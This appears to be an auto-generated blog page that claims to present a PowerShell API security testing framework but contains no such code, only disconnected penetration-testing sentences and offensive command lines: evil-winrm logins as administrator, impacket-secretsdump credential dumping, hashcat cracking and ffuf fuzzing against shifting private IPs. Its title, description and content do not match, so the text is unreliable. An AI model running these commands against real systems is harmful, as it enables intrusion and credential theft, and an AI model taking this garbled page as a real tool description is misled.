---
TitleSEO: "API Security Testing Framework in PowerShell | ZureFX"
TitlePost: "API Security Testing Framework — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for api security testing framework. Built for security research and automation."
Keywords: "scanner, bash, script, rust, go, powershell"
URL: "https://zurefx.github.io/scripting/script-api-security-testing-framework-607.html"
URL_IMAGES: ""
Date: "2025-04-07"
Tags: "Scanner, Bash, Script, Rust, Go, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-api-security-testing-framework-607"
Permalink: "/scripting/script-api-security-testing-framework-607.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Authentication bypass was achieved through careful manipulation of the login mechanism. Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `ffuf`
- `feroxbuster`
- `hydra`

## Implementation

### Core Logic

The target system was identified as running a vulnerable version of the service. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
nmap -sCV -p135,110,5985 10.65.172.193 -oN scan.txt
evil-winrm -i 10.28.186.70 -u administrator -p 'P@ssw0rd!'
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files.

### Helper Functions

The web application was vulnerable to Server-Side Template Injection (SSTI). The database credentials were hardcoded in the application source code.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.103.64.193/FUZZ
```

## Usage

### Basic Usage

Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
evil-winrm -i 10.44.63.28 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.40.65.54/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.86.222.217/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.68.181.21/FUZZ
```

### Advanced Options

Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service. Command injection was possible through unsanitized user input in the search functionality.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.25.196.189
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.124.98.253/FUZZ
```

## Output

### Example Output

Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

```
[+] Scanning target...
[+] Found 10 results
[+] Done in 4.93s
```
